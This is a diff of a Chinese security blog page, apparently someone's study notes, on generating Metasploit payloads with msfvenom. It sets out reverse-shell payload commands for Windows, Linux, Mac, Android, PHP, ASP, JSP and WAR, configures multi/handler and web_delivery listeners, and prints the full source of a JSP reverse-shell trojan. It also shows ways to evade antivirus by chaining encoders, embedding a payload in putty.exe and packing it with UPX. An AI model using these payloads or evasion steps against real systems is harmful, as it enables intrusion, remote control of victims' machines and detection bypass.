@@ -18,7 +18,7 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"dawoxiansigema.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js" defer></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"dawoxiansigema.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js" defer></script>
 
     <meta name="description" content="仅做学习记录用">
 <meta property="og:type" content="article">
@@ -229,55 +229,152 @@
 <span id="more"></span>
 
 <h1 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h1><p>一般是使用反向代理</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-l  列出所有可用的payload,编码器,空指令……</span><br><span class="line">-p  指定要使用的msf的payload,也可以使用自定义payload,几乎是支持全平台的</span><br><span class="line">-f  指定payload输出的文件类型,--help-formats,可查看支持的所有输出格式</span><br><span class="line">-e  指定要使用那种编码器</span><br><span class="line">-i  指定编码的次数,如果使用编码器</span><br><span class="line">-b  指定坏字符,比如空字符截断问题,等等……</span><br><span class="line">-x  使用一个自定义可执行程序模板,并将payload嵌入其中</span><br><span class="line">-k  当模板被执行时,payload自动分离并注入到新的进程中,一般和-x选项一并使用</span><br><span class="line">-o  指定创建好的payload的存放位置</span><br></pre></td></tr></table></figure>
-
+<pre><code>-l  列出所有可用的payload,编码器,空指令……
+-p  指定要使用的msf的payload,也可以使用自定义payload,几乎是支持全平台的
+-f  指定payload输出的文件类型,--help-formats,可查看支持的所有输出格式
+-e  指定要使用那种编码器
+-i  指定编码的次数,如果使用编码器
+-b  指定坏字符,比如空字符截断问题,等等……
+-x  使用一个自定义可执行程序模板,并将payload嵌入其中
+-k  当模板被执行时,payload自动分离并注入到新的进程中,一般和-x选项一并使用
+-o  指定创建好的payload的存放位置
+</code></pre>
 <h1 id="监听器"><a href="#监听器" class="headerlink" title="监听器"></a>监听器</h1><p>使用 multi&#x2F;handler 模块</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use multi/handler</span><br><span class="line">msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set LHOST 192.168.0.100</span><br><span class="line">msf exploit(handler) &gt; set LPORT 4444</span><br><span class="line">msf exploit(handler) &gt; run</span><br></pre></td></tr></table></figure>
-
+<pre><code>msf &gt; use multi/handler
+msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
+msf exploit(handler) &gt; set LHOST 192.168.0.100
+msf exploit(handler) &gt; set LPORT 4444
+msf exploit(handler) &gt; run
+</code></pre>
 <p>使用 exploit&#x2F;multi&#x2F;handler 模块 楼上的升级版</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set LHOST 192.168.0.100</span><br><span class="line">msf exploit(handler) &gt; set LPORT 4444</span><br><span class="line">msf exploit(handler) &gt; run</span><br></pre></td></tr></table></figure>
-
+<pre><code>msf &gt; use exploit/multi/handler
+msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
+msf exploit(handler) &gt; set LHOST 192.168.0.100
+msf exploit(handler) &gt; set LPORT 4444
+msf exploit(handler) &gt; run
+</code></pre>
 <p>使用 exploit&#x2F;multi&#x2F;script&#x2F;web_delivery 模块：该模块可以生成一个可执行文件或 PowerShell 脚本，用于在目标系统上下载和执行 payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf exploit(web_delivery) &gt; set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(web_delivery) &gt; set LHOST 192.168.0.100</span><br><span class="line">msf exploit(web_delivery) &gt; set LPORT 4444</span><br><span class="line">msf exploit(web_delivery) &gt; run</span><br></pre></td></tr></table></figure>
-
-<h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><h2 id="针对计算机介质"><a href="#针对计算机介质" class="headerlink" title="针对计算机介质"></a>针对计算机介质</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f e</span><br><span class="line">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -e x86/shikata_ga_nai -b &#x27;\x00\x0a\xff&#x27; -i 3 -f exe -o x86_shell.exe</span><br><span class="line">msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -e cmd/powershell_base64 -i 3 -f raw -o x86_shell.ps1</span><br></pre></td></tr></table></figure>
-
-<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f elf -o shell.elf</span><br></pre></td></tr></table></figure>
-
-<h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f macho -o x86_shell.macho</span><br></pre></td></tr></table></figure>
-
-<h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f apk -o x86_shell.apk</span><br></pre></td></tr></table></figure>
-
-<h2 id="针对中间件"><a href="#针对中间件" class="headerlink" title="针对中间件"></a>针对中间件</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f raw -o shell.php</span><br></pre></td></tr></table></figure>
-
-<h3 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f asp -o shell.asp</span><br></pre></td></tr></table></figure>
-
-<h3 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f raw -o shell.jsp</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f war -o shell.war</span><br></pre></td></tr></table></figure>
-
+<pre><code>msf &gt; use exploit/multi/script/web_delivery
+msf exploit(web_delivery) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
+msf exploit(web_delivery) &gt; set LHOST 192.168.0.100
+msf exploit(web_delivery) &gt; set LPORT 4444
+msf exploit(web_delivery) &gt; run
+</code></pre>
+<h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><h2 id="针对计算机介质"><a href="#针对计算机介质" class="headerlink" title="针对计算机介质"></a>针对计算机介质</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f e
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -e x86/shikata_ga_nai -b &#39;\x00\x0a\xff&#39; -i 3 -f exe -o x86_shell.exe
+msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -e cmd/powershell_base64 -i 3 -f raw -o x86_shell.ps1
+</code></pre>
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><pre><code>msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f elf -o shell.elf
+</code></pre>
+<h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><pre><code>msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f macho -o x86_shell.macho
+</code></pre>
+<h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><pre><code>msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f apk -o x86_shell.apk
+</code></pre>
+<h2 id="针对中间件"><a href="#针对中间件" class="headerlink" title="针对中间件"></a>针对中间件</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><pre><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f raw -o shell.php
+</code></pre>
+<h3 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h3><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f asp -o shell.asp
+</code></pre>
+<h3 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h3><pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f raw -o shell.jsp
+</code></pre>
+<h3 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h3><pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f war -o shell.war
+</code></pre>
 <p>对于 WAR 文件而言 可以通过以下命令快速找出具体 jsp 页面</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">❯ jar -ft shellname.war</span><br><span class="line">WEB-INF/</span><br><span class="line">WEB-INF/web.xml</span><br><span class="line">zegeqsbdu.jsp</span><br><span class="line"></span><br><span class="line">curl http://10.10.10.95:8080/shellname/zegeqsbdu.jsp</span><br></pre></td></tr></table></figure>
+<pre><code>❯ jar -ft shellname.war
+WEB-INF/
+WEB-INF/web.xml
+zegeqsbdu.jsp
 
+curl http://10.10.10.95:8080/shellname/zegeqsbdu.jsp
+</code></pre>
 <p>当然像 Tomcat Web Manager 那样有 gui 的 上传完直接点击就送</p>
 <h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>WAR 文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">❯ head -c 16 shell.war | xxd</span><br><span class="line">00000000: 504b 0304 1400 0000 0000 a56a 1d5b 0000  PK.........j.[..</span><br></pre></td></tr></table></figure>
-
+<pre><code>❯ head -c 16 shell.war | xxd
+00000000: 504b 0304 1400 0000 0000 a56a 1d5b 0000  PK.........j.[..
+</code></pre>
 <p>是个实实在在的压缩包</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">❯ jar -ft shell.war</span><br><span class="line">WEB-INF/ # version相关内容</span><br><span class="line">WEB-INF/web.xml # version相关内容</span><br><span class="line">zegeqsbdu.jsp #木马实现</span><br><span class="line"></span><br><span class="line"># zegeqsbdu.jsp</span><br><span class="line"></span><br><span class="line">&lt;%@page import=&quot;java.lang.*&quot;%&gt;</span><br><span class="line">&lt;%@page import=&quot;java.util.*&quot;%&gt;</span><br><span class="line">&lt;%@page import=&quot;java.io.*&quot;%&gt;</span><br><span class="line">&lt;%@page import=&quot;java.net.*&quot;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  class StreamConnector extends Thread</span><br><span class="line">  &#123;</span><br><span class="line">    InputStream iM;</span><br><span class="line">    OutputStream ay;</span><br><span class="line"></span><br><span class="line">    StreamConnector( InputStream iM, OutputStream ay )</span><br><span class="line">    &#123;</span><br><span class="line">      this.iM = iM;</span><br><span class="line">      this.ay = ay;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void run()</span><br><span class="line">    &#123;</span><br><span class="line">      BufferedReader ay  = null;</span><br><span class="line">      BufferedWriter s5h = null;</span><br><span class="line">      try</span><br><span class="line">      &#123;</span><br><span class="line">        ay  = new BufferedReader( new InputStreamReader( this.iM ) );</span><br><span class="line">        s5h = new BufferedWriter( new OutputStreamWriter( this.ay ) );</span><br><span class="line">        char buffer[] = new char[8192];</span><br><span class="line">        int length;</span><br><span class="line">        while( ( length = ay.read( buffer, 0, buffer.length ) ) &gt; 0 )</span><br><span class="line">        &#123;</span><br><span class="line">          s5h.write( buffer, 0, length );</span><br><span class="line">          s5h.flush();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; catch( Exception e )&#123;&#125;</span><br><span class="line">      try</span><br><span class="line">      &#123;</span><br><span class="line">        if( ay != null )</span><br><span class="line">          ay.close();</span><br><span class="line">        if( s5h != null )</span><br><span class="line">          s5h.close();</span><br><span class="line">      &#125; catch( Exception e )&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  try</span><br><span class="line">  &#123;</span><br><span class="line">    String ShellPath;</span><br><span class="line">if (System.getProperty(&quot;os.name&quot;).toLowerCase().indexOf(&quot;windows&quot;) == -1) &#123;</span><br><span class="line">  ShellPath = new String(&quot;/bin/sh&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  ShellPath = new String(&quot;cmd.exe&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    Socket socket = new Socket( &quot;10.10.*.*&quot;, 4444 );</span><br><span class="line">    Process process = Runtime.getRuntime().exec( ShellPath );</span><br><span class="line">    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();</span><br><span class="line">    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();</span><br><span class="line">  &#125; catch( Exception e ) &#123;&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>❯ jar -ft shell.war
+WEB-INF/ # version相关内容
+WEB-INF/web.xml # version相关内容
+zegeqsbdu.jsp #木马实现
 
+# zegeqsbdu.jsp
+
+&lt;%@page import=&quot;java.lang.*&quot;%&gt;
+&lt;%@page import=&quot;java.util.*&quot;%&gt;
+&lt;%@page import=&quot;java.io.*&quot;%&gt;
+&lt;%@page import=&quot;java.net.*&quot;%&gt;
+
+&lt;%
+  class StreamConnector extends Thread
+  &#123;
+    InputStream iM;
+    OutputStream ay;
+
+    StreamConnector( InputStream iM, OutputStream ay )
+    &#123;
+      this.iM = iM;
+      this.ay = ay;
+    &#125;
+
+    public void run()
+    &#123;
+      BufferedReader ay  = null;
+      BufferedWriter s5h = null;
+      try
+      &#123;
+        ay  = new BufferedReader( new InputStreamReader( this.iM ) );
+        s5h = new BufferedWriter( new OutputStreamWriter( this.ay ) );
+        char buffer[] = new char[8192];
+        int length;
+        while( ( length = ay.read( buffer, 0, buffer.length ) ) &gt; 0 )
+        &#123;
+          s5h.write( buffer, 0, length );
+          s5h.flush();
+        &#125;
+      &#125; catch( Exception e )&#123;&#125;
+      try
+      &#123;
+        if( ay != null )
+          ay.close();
+        if( s5h != null )
+          s5h.close();
+      &#125; catch( Exception e )&#123;&#125;
+    &#125;
+  &#125;
+
+  try
+  &#123;
+    String ShellPath;
+if (System.getProperty(&quot;os.name&quot;).toLowerCase().indexOf(&quot;windows&quot;) == -1) &#123;
+  ShellPath = new String(&quot;/bin/sh&quot;);
+&#125; else &#123;
+  ShellPath = new String(&quot;cmd.exe&quot;);
+&#125;
+
+    Socket socket = new Socket( &quot;10.10.*.*&quot;, 4444 );
+    Process process = Runtime.getRuntime().exec( ShellPath );
+    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
+    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
+  &#125; catch( Exception e ) &#123;&#125;
+%&gt;
+</code></pre>
 <h1 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h1><p>以 x86 的 Windows 情况来说 可以使用多重编码器混淆</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -e x86/shikata_ga_nai -i 10 -f raw </span><br><span class="line">| msfvenom -e x86/alpha_upper -a x86 --platform windows -i5 -f raw </span><br><span class="line">| msfvenom -e x86/shikkata_ga_nai -a x86 --platform windows -i 10 -f raw </span><br><span class="line">| msfvenom -e x86/countdown -a x86 --platform windows -i 10 -b &#x27;\x00\x0a\xff&#x27; -f exe -o shell.exe</span><br></pre></td></tr></table></figure>
-
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -e x86/shikata_ga_nai -i 10 -f raw 
+| msfvenom -e x86/alpha_upper -a x86 --platform windows -i5 -f raw 
+| msfvenom -e x86/shikkata_ga_nai -a x86 --platform windows -i 10 -f raw 
+| msfvenom -e x86/countdown -a x86 --platform windows -i 10 -b &#39;\x00\x0a\xff&#39; -f exe -o shell.exe
+</code></pre>
 <p>或者更换可执行文件模版</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -e x86/shikata_ga_nai -x putty.exe -k -i 5 -f exe -o shell.exe</span><br></pre></td></tr></table></figure>
-
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -e x86/shikata_ga_nai -x putty.exe -k -i 5 -f exe -o shell.exe
+</code></pre>
 <p>要么还可以加壳</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upx -5 shell.exe -o upx5_shell.exe</span><br><span class="line">upx -9 shell.exe -o upx9_shell.exe</span><br></pre></td></tr></table></figure>
-
+<pre><code>upx -5 shell.exe -o upx5_shell.exe
+upx -9 shell.exe -o upx9_shell.exe
+</code></pre>
 <p>甚至还可以先不编译</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -e x86/shikata_ga_nai -i 15 -b &#x27;\x00\&#x27; -f c -o shell.c</span><br></pre></td></tr></table></figure>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -e x86/shikata_ga_nai -i 15 -b &#39;\x00\&#39; -f c -o shell.c
+</code></pre>
+
     </div>
 
     
